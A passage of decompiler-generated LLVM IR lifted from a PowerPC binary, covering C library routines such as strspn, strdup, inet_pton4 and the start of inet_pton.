  br i1 %v3_1000eb1c, label %dec_label_pc_1000eb24, label %dec_label_pc_1000eb14

dec_label_pc_1000eb24:                            ; preds = %dec_label_pc_1000eb14
  %v3_1000eb24 = icmp eq i32 %arg2, 3
  store i1 %v3_1000eb24, i1* %cr7_eq.global-to-local, align 1
  %v1_1000eb28 = add i32 %v0_1000eb14, -1
  store i32 %v1_1000eb28, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000ebc4, label %dec_label_pc_1000eb34

dec_label_pc_1000eb34:                            ; preds = %dec_label_pc_1000eb24
  %v1_1000eb34 = udiv i32 %arg2, 4
  store i32 %v1_1000eb34, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000eb3c

dec_label_pc_1000eb3c:                            ; preds = %dec_label_pc_1000eb3c.dec_label_pc_1000eb3c_crit_edge, %dec_label_pc_1000eb34
  %v2_1000eb4c = phi i32 [ %v0_1000eb40.pre, %dec_label_pc_1000eb3c.dec_label_pc_1000eb3c_crit_edge ], [ %v1_1000eb28, %dec_label_pc_1000eb34 ]
  %v0_1000eb3c = load i32, i32* @r4, align 4
  %v1_1000eb3c = inttoptr i32 %v0_1000eb3c to i8*
  %v2_1000eb3c = load i8, i8* %v1_1000eb3c, align 1
  %v1_1000eb40 = add i32 %v2_1000eb4c, 1
  store i32 %v1_1000eb40, i32* %r9.global-to-local, align 4
  %v1_1000eb44 = add i32 %v2_1000eb4c, 2
  store i32 %v1_1000eb44, i32* %r7.global-to-local, align 4
  %v3_1000eb48 = icmp eq i8 %v2_1000eb3c, 0
  store i1 %v3_1000eb48, i1* %cr7_eq.global-to-local, align 1
  %v4_1000eb4c = inttoptr i32 %v1_1000eb40 to i8*
  store i8 %v2_1000eb3c, i8* %v4_1000eb4c, align 1
  %v0_1000eb50 = load i32, i32* @r4, align 4
  %v1_1000eb50 = add i32 %v0_1000eb50, 1
  store i32 %v1_1000eb50, i32* %r11.global-to-local, align 4
  %v0_1000eb54 = load i32, i32* @lr, align 4
  %v1_1000eb54 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000eb54, i32 %v0_1000eb54)
  %v0_1000eb58 = load i32, i32* @r4, align 4
  %v1_1000eb58 = add i32 %v0_1000eb58, 1
  %v2_1000eb58 = inttoptr i32 %v1_1000eb58 to i8*
  %v3_1000eb58 = load i8, i8* %v2_1000eb58, align 1
  %v0_1000eb5c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb5c = add i32 %v0_1000eb5c, 1
  store i32 %v1_1000eb5c, i32* %r8.global-to-local, align 4
  %v0_1000eb60 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000eb60 = add i32 %v0_1000eb60, 1
  store i32 %v1_1000eb60, i32* %r10.global-to-local, align 4
  %v3_1000eb64 = icmp eq i8 %v3_1000eb58, 0
  store i1 %v3_1000eb64, i1* %cr7_eq.global-to-local, align 1
  %v2_1000eb68 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000eb68 = add i32 %v2_1000eb68, 1
  %v4_1000eb68 = inttoptr i32 %v3_1000eb68 to i8*
  store i8 %v3_1000eb58, i8* %v4_1000eb68, align 1
  %v0_1000eb6c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eb6c = add i32 %v0_1000eb6c, 1
  store i32 %v1_1000eb6c, i32* %r9.global-to-local, align 4
  %v1_1000eb70 = add i32 %v0_1000eb6c, 2
  store i32 %v1_1000eb70, i32* @r4, align 4
  %v0_1000eb74 = load i32, i32* @lr, align 4
  %v1_1000eb74 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000eb74, i32 %v0_1000eb74)
  %v0_1000eb78 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb78 = add i32 %v0_1000eb78, 1
  %v2_1000eb78 = inttoptr i32 %v1_1000eb78 to i8*
  %v3_1000eb78 = load i8, i8* %v2_1000eb78, align 1
  %v0_1000eb7c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eb7c = add i32 %v0_1000eb7c, 1
  store i32 %v1_1000eb7c, i32* %r11.global-to-local, align 4
  %v3_1000eb80 = icmp eq i8 %v3_1000eb78, 0
  store i1 %v3_1000eb80, i1* %cr7_eq.global-to-local, align 1
  %v2_1000eb84 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000eb84 = add i32 %v2_1000eb84, 1
  %v4_1000eb84 = inttoptr i32 %v3_1000eb84 to i8*
  store i8 %v3_1000eb78, i8* %v4_1000eb84, align 1
  %v0_1000eb88 = load i32, i32* @lr, align 4
  %v1_1000eb88 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000eb88, i32 %v0_1000eb88)
  %v0_1000eb8c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eb8c = add i32 %v0_1000eb8c, 1
  %v2_1000eb8c = inttoptr i32 %v1_1000eb8c to i8*
  %v3_1000eb8c = load i8, i8* %v2_1000eb8c, align 1
  %v4_1000eb8c = zext i8 %v3_1000eb8c to i32
  store i32 %v4_1000eb8c, i32* %r9.global-to-local, align 4
  %v3_1000eb90 = icmp eq i8 %v3_1000eb8c, 0
  store i1 %v3_1000eb90, i1* %cr7_eq.global-to-local, align 1
  %v2_1000eb94 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000eb94 = add i32 %v2_1000eb94, 1
  %v4_1000eb94 = inttoptr i32 %v3_1000eb94 to i8*
  store i8 %v3_1000eb8c, i8* %v4_1000eb94, align 1
  %v0_1000eb98 = load i32, i32* @lr, align 4
  %v1_1000eb98 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000eb98, i32 %v0_1000eb98)
  %v0_1000eb9c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb9c = add i32 %v0_1000eb9c, -1
  store i32 %v1_1000eb9c, i32* %ctr.global-to-local, align 4
  %v2_1000eb9c = icmp eq i32 %v1_1000eb9c, 0
  br i1 %v2_1000eb9c, label %dec_label_pc_1000eba0, label %dec_label_pc_1000eb3c.dec_label_pc_1000eb3c_crit_edge

dec_label_pc_1000eb3c.dec_label_pc_1000eb3c_crit_edge: ; preds = %dec_label_pc_1000eb3c
  %v0_1000eb40.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eb3c

dec_label_pc_1000eba0:                            ; preds = %dec_label_pc_1000eb3c
  %v0_1000eba0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000eba0 = urem i32 %v0_1000eba0, 4
  store i32 %v1_1000eba0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ebc4

dec_label_pc_1000eba8:                            ; preds = %dec_label_pc_1000ebc4, %dec_label_pc_1000eba8.dec_label_pc_1000eba8_crit_edge
  %v0_1000ebac = phi i32 [ %v0_1000ebac.pre, %dec_label_pc_1000eba8.dec_label_pc_1000eba8_crit_edge ], [ %v0_1000ebc4, %dec_label_pc_1000ebc4 ]
  %v0_1000eba8 = load i32, i32* @r4, align 4
  %v1_1000eba8 = inttoptr i32 %v0_1000eba8 to i8*
  %v2_1000eba8 = load i8, i8* %v1_1000eba8, align 1
  %v3_1000eba8 = zext i8 %v2_1000eba8 to i32
  store i32 %v3_1000eba8, i32* %r9.global-to-local, align 4
  %v1_1000ebac = add i32 %v0_1000ebac, -1
  store i32 %v1_1000ebac, i32* %r5.global-to-local, align 4
  %v1_1000ebb0 = add i32 %v0_1000eba8, 1
  store i32 %v1_1000ebb0, i32* @r4, align 4
  %v3_1000ebb4 = icmp eq i8 %v2_1000eba8, 0
  store i1 %v3_1000ebb4, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ebb8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ebb8 = add i32 %v2_1000ebb8, 1
  %v4_1000ebb8 = inttoptr i32 %v3_1000ebb8 to i8*
  store i8 %v2_1000eba8, i8* %v4_1000ebb8, align 1
  store i32 %v3_1000ebb8, i32* %r11.global-to-local, align 4
  %v0_1000ebbc = load i32, i32* @lr, align 4
  %v1_1000ebbc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ebbc, i32 %v0_1000ebbc)
  %v0_1000ebcc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ebcc = add i32 %v0_1000ebcc, -1
  store i32 %v1_1000ebcc, i32* %ctr.global-to-local, align 4
  %v2_1000ebcc = icmp eq i32 %v1_1000ebcc, 0
  br i1 %v2_1000ebcc, label %dec_label_pc_1000ebd0, label %dec_label_pc_1000eba8.dec_label_pc_1000eba8_crit_edge

dec_label_pc_1000eba8.dec_label_pc_1000eba8_crit_edge: ; preds = %dec_label_pc_1000eba8
  %v0_1000ebac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000eba8

dec_label_pc_1000ebc4:                            ; preds = %dec_label_pc_1000eb24, %dec_label_pc_1000eba0
  %v0_1000ebc4 = phi i32 [ %arg2, %dec_label_pc_1000eb24 ], [ %v1_1000eba0, %dec_label_pc_1000eba0 ]
  store i32 %v0_1000ebc4, i32* %ctr.global-to-local, align 4
  %v2_1000ebcc3 = icmp eq i32 %v0_1000ebc4, 0
  br i1 %v2_1000ebcc3, label %dec_label_pc_1000ebd0, label %dec_label_pc_1000eba8

dec_label_pc_1000ebd0:                            ; preds = %dec_label_pc_1000eba8, %dec_label_pc_1000ebc4
  %v0_1000ebd0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ebd0 = icmp eq i32 %v0_1000ebd0, 0
  store i1 %v3_1000ebd0, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ebd4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ebd0, i32 %v0_1000ebd4)
  %v0_1000ebd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ebd8 = trunc i32 %v0_1000ebd8 to i8
  %v2_1000ebd8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ebd8 = add i32 %v2_1000ebd8, 1
  %v4_1000ebd8 = inttoptr i32 %v3_1000ebd8 to i8*
  store i8 %v1_1000ebd8, i8* %v4_1000ebd8, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000ebc4, { 1, 2, 0 }
  uselistorder i32 %v1_1000ebcc, { 1, 0 }
  uselistorder i32 %v1_1000eba0, { 1, 0 }
  uselistorder i32 %v1_1000eb9c, { 1, 0 }
  uselistorder i32 %v2_1000eb4c, { 1, 0 }
  uselistorder i32 %v1_1000eb18, { 1, 0 }
  uselistorder i32 %v0_1000eb14, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000ebd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebc4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ec101 = load i32, i32* @r3, align 4
  %v1_1000ec102 = inttoptr i32 %v0_1000ec101 to i8*
  %v2_1000ec103 = load i8, i8* %v1_1000ec102, align 1
  %v3_1000ec146 = icmp eq i8 %v2_1000ec103, 0
  br i1 %v3_1000ec146, label %dec_label_pc_1000ec24, label %dec_label_pc_1000ec1c

dec_label_pc_1000ebec:                            ; preds = %dec_label_pc_1000ebec, %dec_label_pc_1000ec1c
  %v0_1000ebec = phi i32 [ %v1_1000ebf0, %dec_label_pc_1000ebec ], [ %tmp, %dec_label_pc_1000ec1c ]
  %v1_1000ebec = inttoptr i32 %v0_1000ebec to i8*
  %v2_1000ebec = load i8, i8* %v1_1000ebec, align 1
  %v1_1000ebf0 = add i32 %v0_1000ebec, 1
  %v3_1000ebf4 = icmp eq i8 %v2_1000ebec, 0
  %v4_1000ebf8 = icmp eq i8 %v0_1000ebf88.in, %v2_1000ebec
  %brmerge = or i1 %v3_1000ebf4, %v4_1000ebf8
  br i1 %brmerge, label %dec_label_pc_1000ec00, label %dec_label_pc_1000ebec

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000ebec
  br i1 %v3_1000ebf4, label %dec_label_pc_1000ec24, label %dec_label_pc_1000ec08

dec_label_pc_1000ec08:                            ; preds = %dec_label_pc_1000ec00
  %v1_1000ec08 = add i32 %v0_1000ec08, 1
  %v1_1000ec0c = add i32 %v0_1000ec0c, 1
  %v1_1000ec10 = inttoptr i32 %v1_1000ec0c to i8*
  %v2_1000ec10 = load i8, i8* %v1_1000ec10, align 1
  %v3_1000ec14 = icmp eq i8 %v2_1000ec10, 0
  br i1 %v3_1000ec14, label %dec_label_pc_1000ec24, label %dec_label_pc_1000ec1c

dec_label_pc_1000ec1c:                            ; preds = %entry, %dec_label_pc_1000ec08
  %v0_1000ec0c = phi i32 [ %v1_1000ec0c, %dec_label_pc_1000ec08 ], [ %v0_1000ec101, %entry ]
  %v0_1000ec08 = phi i32 [ %v1_1000ec08, %dec_label_pc_1000ec08 ], [ 0, %entry ]
  %v0_1000ebf88.in = phi i8 [ %v2_1000ec10, %dec_label_pc_1000ec08 ], [ %v2_1000ec103, %entry ]
  br label %dec_label_pc_1000ebec

dec_label_pc_1000ec24:                            ; preds = %dec_label_pc_1000ec08, %dec_label_pc_1000ec00, %entry
  %v0_1000ec24 = phi i32 [ 0, %entry ], [ %v1_1000ec08, %dec_label_pc_1000ec08 ], [ %v0_1000ec08, %dec_label_pc_1000ec00 ]
  ret i32 %v0_1000ec24

; uselistorder directives
  uselistorder i32 %v0_1000ebec, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebec, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1000ec40 = call i32 @__GI_strlen()
  %v1_1000ec44 = add i32 %v0_1000ec40, 1
  store i32 %v1_1000ec44, i32* @r29, align 4
  store i32 %v1_1000ec44, i32* @r3, align 4
  store i32 268495952, i32* @lr, align 4
  %v0_1000ec4c = call i32 @malloc()
  store i32 %v0_1000ec4c, i32* @r3, align 4
  %v0_1000ec50 = load i32, i32* @r28, align 4
  store i32 %v0_1000ec50, i32* @r4, align 4
  store i32 %v0_1000ec4c, i32* @r31, align 4
  %v3_1000ec54 = icmp eq i32 %v0_1000ec4c, 0
  %v0_1000ec58 = load i32, i32* @r29, align 4
  store i32 %v0_1000ec58, i32* @r5, align 4
  br i1 %v3_1000ec54, label %dec_label_pc_1000ec64, label %dec_label_pc_1000ec60

dec_label_pc_1000ec60:                            ; preds = %entry
  store i32 268495972, i32* @lr, align 4
  %v0_1000ec60 = call i32 @memcpy()
  %v0_1000ec68.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ec64

dec_label_pc_1000ec64:                            ; preds = %entry, %dec_label_pc_1000ec60
  %v0_1000ec68 = phi i32 [ 0, %entry ], [ %v0_1000ec68.pre, %dec_label_pc_1000ec60 ]
  ret i32 %v0_1000ec68

; uselistorder directives
  uselistorder i32 ()* @malloc, { 0, 4, 3, 15, 14, 8, 7, 13, 12, 11, 10, 9, 6, 5, 2, 1 }
  uselistorder label %dec_label_pc_1000ec64, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000ec7c = load i32, i32* @lr, align 4
  store i32 %v0_1000ec7c, i32* %r0.global-to-local, align 4
  %v0_1000ec84 = call i32 @__asm_mfcr()
  store i32 %v0_1000ec84, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000ec90 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000ec90, i32* %r7.global-to-local, align 4
  %v0_1000ec94 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ecfc

dec_label_pc_1000ecac:                            ; preds = %dec_label_pc_1000ecfc
  %v3_1000ecac = icmp eq i32 %v0_1000ed20, 4
  store i1 %v3_1000ecac, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ecb0 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000ecb0, label %dec_label_pc_1000ece8, label %dec_label_pc_1000ecb4

dec_label_pc_1000ecb4:                            ; preds = %dec_label_pc_1000ecac
  %v0_1000ecb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000ecb4 = inttoptr i32 %v0_1000ecb4 to i8*
  %v2_1000ecb4 = load i8, i8* %v1_1000ecb4, align 1
  %v3_1000ecb4 = zext i8 %v2_1000ecb4 to i32
  %v1_1000ecb8 = mul nuw nsw i32 %v3_1000ecb4, 10
  %v1_1000ecbc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ecbc = add i32 %v1_1000ecb8, %v1_1000ecbc
  %v1_1000ecc0 = add i32 %v2_1000ecbc, -48
  store i32 %v1_1000ecc0, i32* %r0.global-to-local, align 4
  %v2_1000ecc4 = icmp ugt i32 %v1_1000ecc0, 255
  %v3_1000ecc4 = icmp eq i32 %v1_1000ecc0, 255
  store i1 %v3_1000ecc4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ecc4, label %dec_label_pc_1000ed44, label %dec_label_pc_1000eccc

dec_label_pc_1000eccc:                            ; preds = %dec_label_pc_1000ecb4
  %v1_1000eccc = trunc i32 %v1_1000ecc0 to i8
  store i8 %v1_1000eccc, i8* %v1_1000ecb4, align 1
  %v0_1000ecd0 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000ecd0, label %dec_label_pc_1000ecd4, label %dec_label_pc_1000ecfc.backedge

dec_label_pc_1000ecd4:                            ; preds = %dec_label_pc_1000eccc
  %v0_1000ecd4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ecd4 = add i32 %v0_1000ecd4, 1
  store i32 %v1_1000ecd4, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000ecdc = icmp sgt i32 %v1_1000ecd4, 4
  %v3_1000ecdc = icmp eq i32 %v1_1000ecd4, 4
  store i1 %v3_1000ecdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ecdc, label %dec_label_pc_1000ed44, label %dec_label_pc_1000ecfc.backedge

dec_label_pc_1000ece8:                            ; preds = %dec_label_pc_1000ecac
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1000ecec = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ecec.not = xor i1 %v0_1000ecec, true
  %v0_1000ecf0 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000ecac, %v0_1000ecf0
  %or.cond = or i1 %brmerge, %v0_1000ecec.not
  br i1 %or.cond, label %dec_label_pc_1000ed44, label %dec_label_pc_1000ecf8

dec_label_pc_1000ecf8:                            ; preds = %dec_label_pc_1000ece8
  %v0_1000ecf8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ecf8 = trunc i32 %v0_1000ecf8 to i8
  %v2_1000ecf8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000ecf8 = add i32 %v2_1000ecf8, 1
  %v4_1000ecf8 = inttoptr i32 %v3_1000ecf8 to i8*
  store i8 %v1_1000ecf8, i8* %v4_1000ecf8, align 1
  store i32 %v3_1000ecf8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ecfc.backedge

dec_label_pc_1000ecfc.backedge:                   ; preds = %dec_label_pc_1000ecf8, %dec_label_pc_1000eccc, %dec_label_pc_1000ecd4
  %v0_1000ecfc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ed00.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ecfc

dec_label_pc_1000ecfc:                            ; preds = %dec_label_pc_1000ecfc.backedge, %entry
  %v0_1000ed00 = phi i32 [ %v0_1000ed00.pre, %dec_label_pc_1000ecfc.backedge ], [ 0, %entry ]
  %v0_1000ed04 = phi i32 [ %v0_1000ecfc.pre, %dec_label_pc_1000ecfc.backedge ], [ %v0_1000ec84, %entry ]
  %v1_1000ecfc = inttoptr i32 %v0_1000ed04 to i8*
  %v2_1000ecfc = load i8, i8* %v1_1000ecfc, align 1
  %v3_1000ecfc = zext i8 %v2_1000ecfc to i32
  store i32 %v3_1000ecfc, i32* %r11.global-to-local, align 4
  %v3_1000ed00 = icmp eq i32 %v0_1000ed00, 0
  store i1 %v3_1000ed00, i1* %cr4_eq.global-to-local, align 1
  %v1_1000ed04 = add i32 %v0_1000ed04, 1
  store i32 %v1_1000ed04, i32* %r3.global-to-local, align 4
  %v3_1000ed08 = icmp eq i8 %v2_1000ecfc, 0
  store i1 %v3_1000ed08, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ed0c = add nsw i32 %v3_1000ecfc, -48
  store i32 %v1_1000ed0c, i32* %r0.global-to-local, align 4
  %v2_1000ed10 = icmp ugt i32 %v1_1000ed0c, 9
  store i1 %v2_1000ed10, i1* %cr6_gt.global-to-local, align 1
  %v3_1000ed14 = icmp eq i8 %v2_1000ecfc, 46
  store i1 %v3_1000ed14, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ed18 = load i4, i4* @cr4, align 1
  %v1_1000ed18 = call %2 @__asm_mcrf_cr0_write(i4 %v0_1000ed18)
  %v4_1000ed18 = extractvalue %2 %v1_1000ed18, 2
  store i1 %v4_1000ed18, i1* %cr0_eq.global-to-local, align 1
  %v0_1000ed1c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ed20 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000ed1c, label %dec_label_pc_1000ed20, label %dec_label_pc_1000ecac

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ecfc
  %v3_1000ed20 = icmp eq i32 %v0_1000ed20, 3
  store i1 %v3_1000ed20, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1000ed20, 4
  br i1 %tmp9, label %dec_label_pc_1000ed44, label %dec_label_pc_1000ed28

dec_label_pc_1000ed28:                            ; preds = %dec_label_pc_1000ed20
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000ec90, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ed38.681 to i32), i32* @lr, align 4
  %v0_1000ed34 = call i32 @memcpy()
  br label %dec_label_pc_1000ed44

dec_label_pc_1000ed44:                            ; preds = %dec_label_pc_1000ece8, %dec_label_pc_1000ecb4, %dec_label_pc_1000ecd4, %dec_label_pc_1000ed20, %dec_label_pc_1000ed28
  %storemerge = phi i32 [ 1, %dec_label_pc_1000ed28 ], [ 0, %dec_label_pc_1000ed20 ], [ 0, %dec_label_pc_1000ecd4 ], [ 0, %dec_label_pc_1000ecb4 ], [ 0, %dec_label_pc_1000ece8 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ec94, i32* %r0.global-to-local, align 4
  %v1_1000ed54 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000ec84)
  %v4_1000ed54 = extractvalue %0 %v1_1000ed54, 2
  store i1 %v4_1000ed54, i1* %cr0_eq.global-to-local, align 1
  %v9_1000ed54 = extractvalue %0 %v1_1000ed54, 7
  store i4 %v9_1000ed54, i4* @cr4, align 1
  %v0_1000ed58 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ed58

; uselistorder directives
  uselistorder i32 %v1_1000ecd4, { 1, 0, 2 }
  uselistorder i32 %v1_1000ecc0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000ec84, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000ed44, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ecfc.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1000ed5c = icmp eq i32 %arg1, 2
  %v0_1000ed60 = load i32, i32* @lr, align 4
  store i32 %v0_1000ed60, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000ed5c, label %dec_label_pc_1000ed88, label %dec_label_pc_1000ed7c

dec_label_pc_1000ed7c:                            ; preds = %entry
  %v3_1000ed7c = icmp eq i32 %arg1, 10
  br i1 %v3_1000ed7c, label %dec_label_pc_1000ed9c, label %dec_label_pc_1000ef38

dec_label_pc_1000ed88:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268496276, i32* @lr, align 4
  %v3_1000ed90 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_1000ed90, i32* %r3.global-to-local, align 4
  store i32 %v3_1000ed90, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000ed9c:                            ; preds = %dec_label_pc_1000ed7c
  %v2_1000ed9c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ed9c, i32* %r3.global-to-local, align 4
  store i32 268496300, i32* @lr, align 4
  %v3_1000eda8 = call i32 @__GI_memset(i32 %v2_1000ed9c, i32 0, i32 16)
  store i32 %v3_1000eda8, i32* %r3.global-to-local, align 4
  %v0_1000edac = load i32, i32* @r29, align 4
  %v1_1000edac = inttoptr i32 %v0_1000edac to i8*
  %v2_1000edac = load i8, i8* %v1_1000edac, align 1
  %v3_1000edac = zext i8 %v2_1000edac to i32
  store i32 %v3_1000edac, i32* %r0.global-to-local, align 4
  store i32 %v3_1000eda8, i32* @r31, align 4
  %v2_1000edb4 = add i32 %v3_1000eda8, 16
  store i32 %v2_1000edb4, i32* @r27, align 4
  %v3_1000edb8 = icmp eq i8 %v2_1000edac, 58
  br i1 %v3_1000edb8, label %dec_label_pc_1000edc0, label %dec_label_pc_1000edcc

dec_label_pc_1000edc0:                            ; preds = %dec_label_pc_1000ed9c
  %v1_1000edc0 = add i32 %v0_1000edac, 1
  %v2_1000edc0 = inttoptr i32 %v1_1000edc0 to i8*
  %v3_1000edc0 = load i8, i8* %v2_1000edc0, align 1
  %v4_1000edc0 = zext i8 %v3_1000edc0 to i32
  store i32 %v4_1000edc0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000edc0, i32* @r29, align 4
  %v3_1000edc4 = icmp eq i8 %v3_1000edc0, 58
  br i1 %v3_1000edc4, label %dec_label_pc_1000edcc, label %dec_label_pc_1000ef4c

dec_label_pc_1000edcc:                            ; preds = %dec_label_pc_1000edc0, %dec_label_pc_1000ed9c
  %v0_1000edcc = phi i32 [ %v1_1000edc0, %dec_label_pc_1000edc0 ], [ %v0_1000edac, %dec_label_pc_1000ed9c ]
  store i32 %v0_1000edcc, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000eea03036 = inttoptr i32 %v0_1000edcc to i8*
  %v2_1000eea03137 = load i8, i8* %v1_1000eea03036, align 1
  %v3_1000eea03238 = zext i8 %v2_1000eea03137 to i32
  store i32 %v3_1000eea03238, i32* %r3.global-to-local, align 4
  store i32 268496552, i32* @lr, align 4
  %v1_1000eea43339 = call i32 @__GI_tolower(i32 %v3_1000eea03238)
